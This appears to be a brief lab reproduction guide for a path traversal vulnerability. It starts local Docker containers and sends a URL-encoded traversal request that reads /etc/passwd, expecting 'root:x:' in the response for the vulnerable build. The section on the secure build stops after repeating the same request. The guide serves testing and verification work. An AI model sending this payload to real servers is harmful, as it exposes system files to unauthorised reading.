# Reproduction Guide

## Vulnerable Version
### Step 1 – Start the Lab Environment
Start all required containers with Docker Compose using `docker-compose.yml`:

```bash
docker-compose up -d
```

### Step 2 – Verify the Vulnerability
Issue the following HTTP request to the local instance:
```bash
curl "127.0.0.1:8081/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd"
```
The response body should contains `root:x:`.

## Not Vulnerable Version
### Step 1 – Start the Lab Environment
Start all required containers with Docker Compose using `docker-compose-secure.yml`:

```bash
docker-compose up -d
```

### Step 2 – Verify the Vulnerability
Issue the following HTTP request to the local instance:
```bash
curl "127.0.0.1:8081/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd"
